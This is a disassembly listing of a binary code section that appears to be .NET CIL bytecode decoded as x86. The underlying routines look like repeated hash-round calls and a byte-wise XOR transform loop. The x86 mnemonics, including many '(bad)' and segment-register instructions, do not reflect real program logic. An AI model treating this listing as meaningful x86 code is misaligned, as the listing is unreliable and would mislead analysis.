  403120:	06                   	push   %es
  403121:	12 06                	adc    (%esi),%al
  403123:	09 11                	or     %edx,(%ecx)
  403125:	04 11                	add    $0x11,%al
  403127:	05 1f 0e 1f 09       	add    $0x91f0e1f,%eax
  40312c:	1f                   	pop    %ds
  40312d:	1a 06                	sbb    (%esi),%al
  40312f:	28 1b                	sub    %bl,(%ebx)
  403131:	00 00                	add    %al,(%eax)
  403133:	06                   	push   %es
  403134:	12 05 11 06 09 11    	adc    0x11090611,%al
  40313a:	04 19                	add    $0x19,%al
  40313c:	1f                   	pop    %ds
  40313d:	0e                   	push   %cs
  40313e:	1f                   	pop    %ds
  40313f:	1b 06                	sbb    (%esi),%eax
  403141:	28 1b                	sub    %bl,(%ebx)
  403143:	00 00                	add    %al,(%eax)
  403145:	06                   	push   %es
  403146:	12 04 11             	adc    (%ecx,%edx,1),%al
  403149:	05 11 06 09 1e       	add    $0x1e090611,%eax
  40314e:	1f                   	pop    %ds
  40314f:	14 1f                	adc    $0x1f,%al
  403151:	1c 06                	sbb    $0x6,%al
  403153:	28 1b                	sub    %bl,(%ebx)
  403155:	00 00                	add    %al,(%eax)
  403157:	06                   	push   %es
  403158:	12 03                	adc    (%ebx),%al
  40315a:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40315d:	05 11 06 1f 0d       	add    $0xd1f0611,%eax
  403162:	1b 1f                	sbb    (%edi),%ebx
  403164:	1d 06 28 1b 00       	sbb    $0x1b2806,%eax
  403169:	00 06                	add    %al,(%esi)
  40316b:	12 06                	adc    (%esi),%al
  40316d:	09 11                	or     %edx,(%ecx)
  40316f:	04 11                	add    $0x11,%al
  403171:	05 18 1f 09 1f       	add    $0x1f091f18,%eax
  403176:	1e                   	push   %ds
  403177:	06                   	push   %es
  403178:	28 1b                	sub    %bl,(%ebx)
  40317a:	00 00                	add    %al,(%eax)
  40317c:	06                   	push   %es
  40317d:	12 05 11 06 09 11    	adc    0x11090611,%al
  403183:	04 1d                	add    $0x1d,%al
  403185:	1f                   	pop    %ds
  403186:	0e                   	push   %cs
  403187:	1f                   	pop    %ds
  403188:	1f                   	pop    %ds
  403189:	06                   	push   %es
  40318a:	28 1b                	sub    %bl,(%ebx)
  40318c:	00 00                	add    %al,(%eax)
  40318e:	06                   	push   %es
  40318f:	12 04 11             	adc    (%ecx,%edx,1),%al
  403192:	05 11 06 09 1f       	add    $0x1f090611,%eax
  403197:	0c 1f                	or     $0x1f,%al
  403199:	14 1f                	adc    $0x1f,%al
  40319b:	20 06                	and    %al,(%esi)
  40319d:	28 1b                	sub    %bl,(%ebx)
  40319f:	00 00                	add    %al,(%eax)
  4031a1:	06                   	push   %es
  4031a2:	12 03                	adc    (%ebx),%al
  4031a4:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4031a7:	05 11 06 1b 1a       	add    $0x1a1b0611,%eax
  4031ac:	1f                   	pop    %ds
  4031ad:	21 06                	and    %eax,(%esi)
  4031af:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4031b2:	00 06                	add    %al,(%esi)
  4031b4:	12 06                	adc    (%esi),%al
  4031b6:	09 11                	or     %edx,(%ecx)
  4031b8:	04 11                	add    $0x11,%al
  4031ba:	05 1e 1f 0b 1f       	add    $0x1f0b1f1e,%eax
  4031bf:	22 06                	and    (%esi),%al
  4031c1:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4031c4:	00 06                	add    %al,(%esi)
  4031c6:	12 05 11 06 09 11    	adc    0x11090611,%al
  4031cc:	04 1f                	add    $0x1f,%al
  4031ce:	0b 1f                	or     (%edi),%ebx
  4031d0:	10 1f                	adc    %bl,(%edi)
  4031d2:	23 06                	and    (%esi),%eax
  4031d4:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4031d7:	00 06                	add    %al,(%esi)
  4031d9:	12 04 11             	adc    (%ecx,%edx,1),%al
  4031dc:	05 11 06 09 1f       	add    $0x1f090611,%eax
  4031e1:	0e                   	push   %cs
  4031e2:	1f                   	pop    %ds
  4031e3:	17                   	pop    %ss
  4031e4:	1f                   	pop    %ds
  4031e5:	24 06                	and    $0x6,%al
  4031e7:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4031ea:	00 06                	add    %al,(%esi)
  4031ec:	12 03                	adc    (%ebx),%al
  4031ee:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4031f1:	05 11 06 17 1a       	add    $0x1a170611,%eax
  4031f6:	1f                   	pop    %ds
  4031f7:	25 06 28 1c 00       	and    $0x1c2806,%eax
  4031fc:	00 06                	add    %al,(%esi)
  4031fe:	12 06                	adc    (%esi),%al
  403200:	09 11                	or     %edx,(%ecx)
  403202:	04 11                	add    $0x11,%al
  403204:	05 1a 1f 0b 1f       	add    $0x1f0b1f1a,%eax
  403209:	26 06                	es push %es
  40320b:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  40320e:	00 06                	add    %al,(%esi)
  403210:	12 05 11 06 09 11    	adc    0x11090611,%al
  403216:	04 1d                	add    $0x1d,%al
  403218:	1f                   	pop    %ds
  403219:	10 1f                	adc    %bl,(%edi)
  40321b:	27                   	daa
  40321c:	06                   	push   %es
  40321d:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  403220:	00 06                	add    %al,(%esi)
  403222:	12 04 11             	adc    (%ecx,%edx,1),%al
  403225:	05 11 06 09 1f       	add    $0x1f090611,%eax
  40322a:	0a 1f                	or     (%edi),%bl
  40322c:	17                   	pop    %ss
  40322d:	1f                   	pop    %ds
  40322e:	28 06                	sub    %al,(%esi)
  403230:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  403233:	00 06                	add    %al,(%esi)
  403235:	12 03                	adc    (%ebx),%al
  403237:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40323a:	05 11 06 1f 0d       	add    $0xd1f0611,%eax
  40323f:	1a 1f                	sbb    (%edi),%bl
  403241:	29 06                	sub    %eax,(%esi)
  403243:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  403246:	00 06                	add    %al,(%esi)
  403248:	12 06                	adc    (%esi),%al
  40324a:	09 11                	or     %edx,(%ecx)
  40324c:	04 11                	add    $0x11,%al
  40324e:	05 16 1f 0b 1f       	add    $0x1f0b1f16,%eax
  403253:	2a 06                	sub    (%esi),%al
  403255:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  403258:	00 06                	add    %al,(%esi)
  40325a:	12 05 11 06 09 11    	adc    0x11090611,%al
  403260:	04 19                	add    $0x19,%al
  403262:	1f                   	pop    %ds
  403263:	10 1f                	adc    %bl,(%edi)
  403265:	2b 06                	sub    (%esi),%eax
  403267:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  40326a:	00 06                	add    %al,(%esi)
  40326c:	12 04 11             	adc    (%ecx,%edx,1),%al
  40326f:	05 11 06 09 1c       	add    $0x1c090611,%eax
  403274:	1f                   	pop    %ds
  403275:	17                   	pop    %ss
  403276:	1f                   	pop    %ds
  403277:	2c 06                	sub    $0x6,%al
  403279:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  40327c:	00 06                	add    %al,(%esi)
  40327e:	12 03                	adc    (%ebx),%al
  403280:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403283:	05 11 06 1f 09       	add    $0x91f0611,%eax
  403288:	1a 1f                	sbb    (%edi),%bl
  40328a:	2d 06 28 1c 00       	sub    $0x1c2806,%eax
  40328f:	00 06                	add    %al,(%esi)
  403291:	12 06                	adc    (%esi),%al
  403293:	09 11                	or     %edx,(%ecx)
  403295:	04 11                	add    $0x11,%al
  403297:	05 1f 0c 1f 0b       	add    $0xb1f0c1f,%eax
  40329c:	1f                   	pop    %ds
  40329d:	2e 06                	cs push %es
  40329f:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4032a2:	00 06                	add    %al,(%esi)
  4032a4:	12 05 11 06 09 11    	adc    0x11090611,%al
  4032aa:	04 1f                	add    $0x1f,%al
  4032ac:	0f 1f 10             	nopl   (%eax)
  4032af:	1f                   	pop    %ds
  4032b0:	2f                   	das
  4032b1:	06                   	push   %es
  4032b2:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4032b5:	00 06                	add    %al,(%esi)
  4032b7:	12 04 11             	adc    (%ecx,%edx,1),%al
  4032ba:	05 11 06 09 18       	add    $0x18090611,%eax
  4032bf:	1f                   	pop    %ds
  4032c0:	17                   	pop    %ss
  4032c1:	1f                   	pop    %ds
  4032c2:	30 06                	xor    %al,(%esi)
  4032c4:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4032c7:	00 06                	add    %al,(%esi)
  4032c9:	12 03                	adc    (%ebx),%al
  4032cb:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4032ce:	05 11 06 16 1c       	add    $0x1c160611,%eax
  4032d3:	1f                   	pop    %ds
  4032d4:	31 06                	xor    %eax,(%esi)
  4032d6:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  4032dc:	06                   	push   %es
  4032dd:	09 11                	or     %edx,(%ecx)
  4032df:	04 11                	add    $0x11,%al
  4032e1:	05 1d 1f 0a 1f       	add    $0x1f0a1f1d,%eax
  4032e6:	32 06                	xor    (%esi),%al
  4032e8:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  4032ee:	05 11 06 09 11       	add    $0x11090611,%eax
  4032f3:	04 1f                	add    $0x1f,%al
  4032f5:	0e                   	push   %cs
  4032f6:	1f                   	pop    %ds
  4032f7:	0f 1f 33             	nopl   (%ebx)
  4032fa:	06                   	push   %es
  4032fb:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  403301:	04 11                	add    $0x11,%al
  403303:	05 11 06 09 1b       	add    $0x1b090611,%eax
  403308:	1f                   	pop    %ds
  403309:	15 1f 34 06 28       	adc    $0x2806341f,%eax
  40330e:	1d 00 00 06 12       	sbb    $0x12060000,%eax
  403313:	03 11                	add    (%ecx),%edx
  403315:	04 11                	add    $0x11,%al
  403317:	05 11 06 1f 0c       	add    $0xc1f0611,%eax
  40331c:	1c 1f                	sbb    $0x1f,%al
  40331e:	35 06 28 1d 00       	xor    $0x1d2806,%eax
  403323:	00 06                	add    %al,(%esi)
  403325:	12 06                	adc    (%esi),%al
  403327:	09 11                	or     %edx,(%ecx)
  403329:	04 11                	add    $0x11,%al
  40332b:	05 19 1f 0a 1f       	add    $0x1f0a1f19,%eax
  403330:	36 06                	ss push %es
  403332:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  403338:	05 11 06 09 11       	add    $0x11090611,%eax
  40333d:	04 1f                	add    $0x1f,%al
  40333f:	0a 1f                	or     (%edi),%bl
  403341:	0f 1f 37             	nopl   (%edi)
  403344:	06                   	push   %es
  403345:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  40334b:	04 11                	add    $0x11,%al
  40334d:	05 11 06 09 17       	add    $0x17090611,%eax
  403352:	1f                   	pop    %ds
  403353:	15 1f 38 06 28       	adc    $0x2806381f,%eax
  403358:	1d 00 00 06 12       	sbb    $0x12060000,%eax
  40335d:	03 11                	add    (%ecx),%edx
  40335f:	04 11                	add    $0x11,%al
  403361:	05 11 06 1e 1c       	add    $0x1c1e0611,%eax
  403366:	1f                   	pop    %ds
  403367:	39 06                	cmp    %eax,(%esi)
  403369:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  40336f:	06                   	push   %es
  403370:	09 11                	or     %edx,(%ecx)
  403372:	04 11                	add    $0x11,%al
  403374:	05 1f 0f 1f 0a       	add    $0xa1f0f1f,%eax
  403379:	1f                   	pop    %ds
  40337a:	3a 06                	cmp    (%esi),%al
  40337c:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  403382:	05 11 06 09 11       	add    $0x11090611,%eax
  403387:	04 1c                	add    $0x1c,%al
  403389:	1f                   	pop    %ds
  40338a:	0f 1f 3b             	nopl   (%ebx)
  40338d:	06                   	push   %es
  40338e:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  403394:	04 11                	add    $0x11,%al
  403396:	05 11 06 09 1f       	add    $0x1f090611,%eax
  40339b:	0d 1f 15 1f 3c       	or     $0x3c1f151f,%eax
  4033a0:	06                   	push   %es
  4033a1:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  4033a7:	03 11                	add    (%ecx),%edx
  4033a9:	04 11                	add    $0x11,%al
  4033ab:	05 11 06 1a 1c       	add    $0x1c1a0611,%eax
  4033b0:	1f                   	pop    %ds
  4033b1:	3d 06 28 1d 00       	cmp    $0x1d2806,%eax
  4033b6:	00 06                	add    %al,(%esi)
  4033b8:	12 06                	adc    (%esi),%al
  4033ba:	09 11                	or     %edx,(%ecx)
  4033bc:	04 11                	add    $0x11,%al
  4033be:	05 1f 0b 1f 0a       	add    $0xa1f0b1f,%eax
  4033c3:	1f                   	pop    %ds
  4033c4:	3e 06                	ds push %es
  4033c6:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  4033cc:	05 11 06 09 11       	add    $0x11090611,%eax
  4033d1:	04 18                	add    $0x18,%al
  4033d3:	1f                   	pop    %ds
  4033d4:	0f 1f 3f             	nopl   (%edi)
  4033d7:	06                   	push   %es
  4033d8:	28 1d 00 00 06 12    	sub    %bl,0x12060000
  4033de:	04 11                	add    $0x11,%al
  4033e0:	05 11 06 09 1f       	add    $0x1f090611,%eax
  4033e5:	09 1f                	or     %ebx,(%edi)
  4033e7:	15 1f 40 06 28       	adc    $0x2806401f,%eax
  4033ec:	1d 00 00 06 09       	sbb    $0x9060000,%eax
  4033f1:	11 0f                	adc    %ecx,(%edi)
  4033f3:	58                   	pop    %eax
  4033f4:	0d 11 04 11 10       	or     $0x10110411,%eax
  4033f9:	58                   	pop    %eax
  4033fa:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4033fd:	05 11 11 58 13       	add    $0x13581111,%eax
  403402:	05 11 06 11 12       	add    $0x12110611,%eax
  403407:	58                   	pop    %eax
  403408:	13 06                	adc    (%esi),%eax
  40340a:	11 0d 17 58 13 0d    	adc    %ecx,0xd135817
  403410:	11 0d 08 1f 10 5c    	adc    %ecx,0x5c101f08
  403416:	44                   	inc    %esp
  403417:	e2 fa                	loop   0x403413
  403419:	ff                   	(bad)
  40341a:	ff 1f                	lcall  *(%edi)
  40341c:	10 8d 1d 00 00 01    	adc    %cl,0x100001d(%ebp)
  403422:	13 07                	adc    (%edi),%eax
  403424:	09 28                	or     %ebp,(%eax)
  403426:	3b 00                	cmp    (%eax),%eax
  403428:	00 0a                	add    %cl,(%edx)
  40342a:	16                   	push   %ss
  40342b:	11 07                	adc    %eax,(%edi)
  40342d:	16                   	push   %ss
  40342e:	1a 28                	sbb    (%eax),%ch
  403430:	3c 00                	cmp    $0x0,%al
  403432:	00 0a                	add    %cl,(%edx)
  403434:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403437:	3b 00                	cmp    (%eax),%eax
  403439:	00 0a                	add    %cl,(%edx)
  40343b:	16                   	push   %ss
  40343c:	11 07                	adc    %eax,(%edi)
  40343e:	1a 1a                	sbb    (%edx),%bl
  403440:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  403443:	00 0a                	add    %cl,(%edx)
  403445:	11 05 28 3b 00 00    	adc    %eax,0x3b28
  40344b:	0a 16                	or     (%esi),%dl
  40344d:	11 07                	adc    %eax,(%edi)
  40344f:	1e                   	push   %ds
  403450:	1a 28                	sbb    (%eax),%ch
  403452:	3c 00                	cmp    $0x0,%al
  403454:	00 0a                	add    %cl,(%edx)
  403456:	11 06                	adc    %eax,(%esi)
  403458:	28 3b                	sub    %bh,(%ebx)
  40345a:	00 00                	add    %al,(%eax)
  40345c:	0a 16                	or     (%esi),%dl
  40345e:	11 07                	adc    %eax,(%edi)
  403460:	1f                   	pop    %ds
  403461:	0c 1a                	or     $0x1a,%al
  403463:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  403466:	00 0a                	add    %cl,(%edx)
  403468:	11 07                	adc    %eax,(%edi)
  40346a:	2a 00                	sub    (%eax),%al
  40346c:	a2 02 03 02 4b       	mov    %al,0x4b020302
  403471:	03 04 5f             	add    (%edi,%ebx,2),%eax
  403474:	03 66 05             	add    0x5(%esi),%esp
  403477:	5f                   	pop    %edi
  403478:	60                   	pusha
  403479:	58                   	pop    %eax
  40347a:	0e                   	push   %cs
  40347b:	07                   	pop    %es
  40347c:	0e                   	push   %cs
  40347d:	04 95                	add    $0x95,%al
  40347f:	58                   	pop    %eax
  403480:	7e 0c                	jle    0x40348e
  403482:	00 00                	add    %al,(%eax)
  403484:	04 0e                	add    $0xe,%al
  403486:	06                   	push   %es
  403487:	17                   	pop    %ss
  403488:	59                   	pop    %ecx
  403489:	95                   	xchg   %eax,%ebp
  40348a:	58                   	pop    %eax
  40348b:	0e                   	push   %cs
  40348c:	05 28 1e 00 00       	add    $0x1e28,%eax
  403491:	06                   	push   %es
  403492:	58                   	pop    %eax
  403493:	54                   	push   %esp
  403494:	2a 00                	sub    (%eax),%al
  403496:	00 00                	add    %al,(%eax)
  403498:	a2 02 03 02 4b       	mov    %al,0x4b020302
  40349d:	03 05 5f 04 05 66    	add    0x6605045f,%eax
  4034a3:	5f                   	pop    %edi
  4034a4:	60                   	pusha
  4034a5:	58                   	pop    %eax
  4034a6:	0e                   	push   %cs
  4034a7:	07                   	pop    %es
  4034a8:	0e                   	push   %cs
  4034a9:	04 95                	add    $0x95,%al
  4034ab:	58                   	pop    %eax
  4034ac:	7e 0c                	jle    0x4034ba
  4034ae:	00 00                	add    %al,(%eax)
  4034b0:	04 0e                	add    $0xe,%al
  4034b2:	06                   	push   %es
  4034b3:	17                   	pop    %ss
  4034b4:	59                   	pop    %ecx
  4034b5:	95                   	xchg   %eax,%ebp
  4034b6:	58                   	pop    %eax
  4034b7:	0e                   	push   %cs
  4034b8:	05 28 1e 00 00       	add    $0x1e28,%eax
  4034bd:	06                   	push   %es
  4034be:	58                   	pop    %eax
  4034bf:	54                   	push   %esp
  4034c0:	2a 00                	sub    (%eax),%al
  4034c2:	00 00                	add    %al,(%eax)
  4034c4:	96                   	xchg   %eax,%esi
  4034c5:	02 03                	add    (%ebx),%al
  4034c7:	02 4b 03             	add    0x3(%ebx),%cl
  4034ca:	04 61                	add    $0x61,%al
  4034cc:	05 61 58 0e 07       	add    $0x70e5861,%eax
  4034d1:	0e                   	push   %cs
  4034d2:	04 95                	add    $0x95,%al
  4034d4:	58                   	pop    %eax
  4034d5:	7e 0c                	jle    0x4034e3
  4034d7:	00 00                	add    %al,(%eax)
  4034d9:	04 0e                	add    $0xe,%al
  4034db:	06                   	push   %es
  4034dc:	17                   	pop    %ss
  4034dd:	59                   	pop    %ecx
  4034de:	95                   	xchg   %eax,%ebp
  4034df:	58                   	pop    %eax
  4034e0:	0e                   	push   %cs
  4034e1:	05 28 1e 00 00       	add    $0x1e28,%eax
  4034e6:	06                   	push   %es
  4034e7:	58                   	pop    %eax
  4034e8:	54                   	push   %esp
  4034e9:	2a 00                	sub    (%eax),%al
  4034eb:	00 9a 02 03 02 4b    	add    %bl,0x4b020302(%edx)
  4034f1:	04 03                	add    $0x3,%al
  4034f3:	05 66 60 61 58       	add    $0x58616066,%eax
  4034f8:	0e                   	push   %cs
  4034f9:	07                   	pop    %es
  4034fa:	0e                   	push   %cs
  4034fb:	04 95                	add    $0x95,%al
  4034fd:	58                   	pop    %eax
  4034fe:	7e 0c                	jle    0x40350c
  403500:	00 00                	add    %al,(%eax)
  403502:	04 0e                	add    $0xe,%al
  403504:	06                   	push   %es
  403505:	17                   	pop    %ss
  403506:	59                   	pop    %ecx
  403507:	95                   	xchg   %eax,%ebp
  403508:	58                   	pop    %eax
  403509:	0e                   	push   %cs
  40350a:	05 28 1e 00 00       	add    $0x1e28,%eax
  40350f:	06                   	push   %es
  403510:	58                   	pop    %eax
  403511:	54                   	push   %esp
  403512:	2a 00                	sub    (%eax),%al
  403514:	46                   	inc    %esi
  403515:	02 1f                	add    (%edi),%bl
  403517:	20 03                	and    %al,(%ebx)
  403519:	59                   	pop    %ecx
  40351a:	1f                   	pop    %ds
  40351b:	1f                   	pop    %ds
  40351c:	5f                   	pop    %edi
  40351d:	64 02 03             	add    %fs:(%ebx),%al
  403520:	1f                   	pop    %ds
  403521:	1f                   	pop    %ds
  403522:	5f                   	pop    %edi
  403523:	62 60 2a             	bound  %esp,0x2a(%eax)
  403526:	00 00                	add    %al,(%eax)
  403528:	6e                   	outsb  %ds:(%esi),(%dx)
  403529:	7e 0d                	jle    0x403538
  40352b:	00 00                	add    %al,(%eax)
  40352d:	04 3a                	add    $0x3a,%al
  40352f:	0b 00                	or     (%eax),%eax
  403531:	00 00                	add    %al,(%eax)
  403533:	28 23                	sub    %ah,(%ebx)
  403535:	00 00                	add    %al,(%eax)
  403537:	06                   	push   %es
  403538:	17                   	pop    %ss
  403539:	80 0d 00 00 04 7e 0e 	orb    $0xe,0x7e040000
  403540:	00 00                	add    %al,(%eax)
  403542:	04 2a                	add    $0x2a,%al
  403544:	1e                   	push   %ds
  403545:	02 28                	add    (%eax),%ch
  403547:	15 00 00 0a 2a       	adc    $0x2a0a0000,%eax
  40354c:	13 30                	adc    (%eax),%esi
  40354e:	06                   	push   %es
  40354f:	00 c0                	add    %al,%al
  403551:	01 00                	add    %eax,(%eax)
  403553:	00 07                	add    %al,(%edi)
  403555:	00 00                	add    %al,(%eax)
  403557:	11 05 8e 69 1a 5d    	adc    %eax,0x5d1a698e
  40355d:	0a 05 8e 69 1a 5b    	or     0x5b1a698e,%al
  403563:	0b 05 8e 69 8d 1d    	or     0x1d8d698e,%eax
  403569:	00 00                	add    %al,(%eax)
  40356b:	01 0c 03             	add    %ecx,(%ebx,%eax,1)
  40356e:	8e 69 1a             	mov    0x1a(%ecx),%gs
  403571:	5b                   	pop    %ebx
  403572:	0d 16 13 04 16       	or     $0x16041316,%eax
  403577:	13 05 16 13 06 06    	adc    0x6061316,%eax
  40357d:	16                   	push   %ss
  40357e:	3e 04 00             	ds add $0x0,%al
  403581:	00 00                	add    %al,(%eax)
  403583:	07                   	pop    %es
  403584:	17                   	pop    %ss
  403585:	58                   	pop    %eax
  403586:	0b 16                	or     (%esi),%edx
  403588:	13 07                	adc    (%edi),%eax
  40358a:	16                   	push   %ss
  40358b:	13 08                	adc    (%eax),%ecx
  40358d:	38 77 01             	cmp    %dh,0x1(%edi)
  403590:	00 00                	add    %al,(%eax)
  403592:	11 08                	adc    %ecx,(%eax)
  403594:	09 5d 13             	or     %ebx,0x13(%ebp)
  403597:	09 11                	or     %edx,(%ecx)
  403599:	08 1a                	or     %bl,(%edx)
  40359b:	5a                   	pop    %edx
  40359c:	13 0a                	adc    (%edx),%ecx
  40359e:	11 09                	adc    %ecx,(%ecx)
  4035a0:	1a 5a 13             	sbb    0x13(%edx),%bl
  4035a3:	07                   	pop    %es
  4035a4:	03 11                	add    (%ecx),%edx
  4035a6:	07                   	pop    %es
  4035a7:	19 58 91             	sbb    %ebx,-0x6f(%eax)
  4035aa:	1f                   	pop    %ds
  4035ab:	18 62 03             	sbb    %ah,0x3(%edx)
  4035ae:	11 07                	adc    %eax,(%edi)
  4035b0:	18 58 91             	sbb    %bl,-0x6f(%eax)
  4035b3:	1f                   	pop    %ds
  4035b4:	10 62 60             	adc    %ah,0x60(%edx)
  4035b7:	03 11                	add    (%ecx),%edx
  4035b9:	07                   	pop    %es
  4035ba:	17                   	pop    %ss
  4035bb:	58                   	pop    %eax
  4035bc:	91                   	xchg   %eax,%ecx
  4035bd:	1e                   	push   %ds
  4035be:	62 60 03             	bound  %esp,0x3(%eax)
  4035c1:	11 07                	adc    %eax,(%edi)
  4035c3:	91                   	xchg   %eax,%ecx
  4035c4:	60                   	pusha
  4035c5:	13 05 20 ff 00 00    	adc    0xff20,%eax
  4035cb:	00 13                	add    %dl,(%ebx)
  4035cd:	0b 16                	or     (%esi),%edx
  4035cf:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4035d2:	08 07                	or     %al,(%edi)
  4035d4:	17                   	pop    %ss
  4035d5:	59                   	pop    %ecx
  4035d6:	40                   	inc    %eax
  4035d7:	49                   	dec    %ecx
  4035d8:	00 00                	add    %al,(%eax)
  4035da:	00 06                	add    %al,(%esi)
  4035dc:	16                   	push   %ss
  4035dd:	3e 42                	ds inc %edx
  4035df:	00 00                	add    %al,(%eax)
  4035e1:	00 16                	add    %dl,(%esi)
  4035e3:	13 06                	adc    (%esi),%eax
  4035e5:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4035e8:	05 58 13 04 16       	add    $0x16041358,%eax
  4035ed:	13 0d 38 23 00 00    	adc    0x2338,%ecx
  4035f3:	00 11                	add    %dl,(%ecx)
  4035f5:	0d 16 3e 06 00       	or     $0x63e16,%eax
  4035fa:	00 00                	add    %al,(%eax)
  4035fc:	11 06                	adc    %eax,(%esi)
  4035fe:	1e                   	push   %ds
  4035ff:	62 13                	bound  %edx,(%ebx)
  403601:	06                   	push   %es
  403602:	11 06                	adc    %eax,(%esi)
  403604:	05 05 8e 69 17       	add    $0x17698e05,%eax
  403609:	11 0d 58 59 91 60    	adc    %ecx,0x60915958
  40360f:	13 06                	adc    (%esi),%eax
  403611:	11 0d 17 58 13 0d    	adc    %ecx,0xd135817
  403617:	11 0d 06 3f d5 ff    	adc    %ecx,0xffd53f06
  40361d:	ff                   	(bad)
  40361e:	ff                   	(bad)
  40361f:	38 2e                	cmp    %ch,(%esi)
  403621:	00 00                	add    %al,(%eax)
  403623:	00 11                	add    %dl,(%ecx)
  403625:	04 11                	add    $0x11,%al
  403627:	05 58 13 04 11       	add    $0x11041358,%eax
  40362c:	0a 13                	or     (%ebx),%dl
  40362e:	07                   	pop    %es
  40362f:	05 11 07 19 58       	add    $0x58190711,%eax
  403634:	91                   	xchg   %eax,%ecx
  403635:	1f                   	pop    %ds
  403636:	18 62 05             	sbb    %ah,0x5(%edx)
  403639:	11 07                	adc    %eax,(%edi)
  40363b:	18 58 91             	sbb    %bl,-0x6f(%eax)
  40363e:	1f                   	pop    %ds
  40363f:	10 62 60             	adc    %ah,0x60(%edx)
  403642:	05 11 07 17 58       	add    $0x58170711,%eax
  403647:	91                   	xchg   %eax,%ecx
  403648:	1e                   	push   %ds
  403649:	62 60 05             	bound  %esp,0x5(%eax)
  40364c:	11 07                	adc    %eax,(%edi)
  40364e:	91                   	xchg   %eax,%ecx
  40364f:	60                   	pusha
  403650:	13 06                	adc    (%esi),%eax
  403652:	11 04 16             	adc    %eax,(%esi,%edx,1)
  403655:	13 04 25 28 29 00 00 	adc    0x2928(,%eiz,1),%eax
  40365c:	06                   	push   %es
  40365d:	58                   	pop    %eax
  40365e:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403661:	08 07                	or     %al,(%edi)
  403663:	17                   	pop    %ss
  403664:	59                   	pop    %ecx
  403665:	40                   	inc    %eax
  403666:	50                   	push   %eax
  403667:	00 00                	add    %al,(%eax)
  403669:	00 06                	add    %al,(%esi)
  40366b:	16                   	push   %ss
  40366c:	3e 49                	ds dec %ecx
  40366e:	00 00                	add    %al,(%eax)
  403670:	00 11                	add    %dl,(%ecx)
  403672:	04 11                	add    $0x11,%al
  403674:	06                   	push   %es
  403675:	61                   	popa
  403676:	13 0e                	adc    (%esi),%ecx
  403678:	16                   	push   %ss
  403679:	13 0f                	adc    (%edi),%ecx
  40367b:	38 2d 00 00 00 11    	cmp    %ch,0x11000000
  403681:	0f 16 3e             	movhps (%esi),%xmm7
  403684:	0c 00                	or     $0x0,%al
  403686:	00 00                	add    %al,(%eax)
  403688:	11 0b                	adc    %ecx,(%ebx)
  40368a:	1e                   	push   %ds
  40368b:	62 13                	bound  %edx,(%ebx)
  40368d:	0b 11                	or     (%ecx),%edx
  40368f:	0c 1e                	or     $0x1e,%al
  403691:	58                   	pop    %eax
  403692:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  403695:	11 0a                	adc    %ecx,(%edx)
  403697:	11 0f                	adc    %ecx,(%edi)
  403699:	58                   	pop    %eax
  40369a:	11 0e                	adc    %ecx,(%esi)
  40369c:	11 0b                	adc    %ecx,(%ebx)
  40369e:	5f                   	pop    %edi
  40369f:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  4036a2:	1f                   	pop    %ds
  4036a3:	5f                   	pop    %edi
  4036a4:	64 d2 9c 11 0f 17 58 	rcrb   %cl,%fs:0x1358170f(%ecx,%edx,1)
  4036ab:	13 
  4036ac:	0f 11 0f             	movups %xmm1,(%edi)
  4036af:	06                   	push   %es
  4036b0:	3f                   	aas
  4036b1:	cb                   	lret
  4036b2:	ff                   	(bad)
  4036b3:	ff                   	(bad)
  4036b4:	ff                   	(bad)
  4036b5:	38 49 00             	cmp    %cl,0x0(%ecx)
  4036b8:	00 00                	add    %al,(%eax)
  4036ba:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4036bd:	06                   	push   %es
  4036be:	61                   	popa
  4036bf:	13 10                	adc    (%eax),%edx
  4036c1:	08 11                	or     %dl,(%ecx)
  4036c3:	0a 11                	or     (%ecx),%dl
  4036c5:	10 20                	adc    %ah,(%eax)
  4036c7:	ff 00                	incl   (%eax)
  4036c9:	00 00                	add    %al,(%eax)
  4036cb:	5f                   	pop    %edi
  4036cc:	d2 9c 08 11 0a 17 58 	rcrb   %cl,0x58170a11(%eax,%ecx,1)
  4036d3:	11 10                	adc    %edx,(%eax)
  4036d5:	20 00                	and    %al,(%eax)
  4036d7:	ff 00                	incl   (%eax)
  4036d9:	00 5f 1e             	add    %bl,0x1e(%edi)
  4036dc:	64 d2 9c 08 11 0a 18 	rcrb   %cl,%fs:0x58180a11(%eax,%ecx,1)
  4036e3:	58 
  4036e4:	11 10                	adc    %edx,(%eax)
  4036e6:	20 00                	and    %al,(%eax)
  4036e8:	00 ff                	add    %bh,%bh
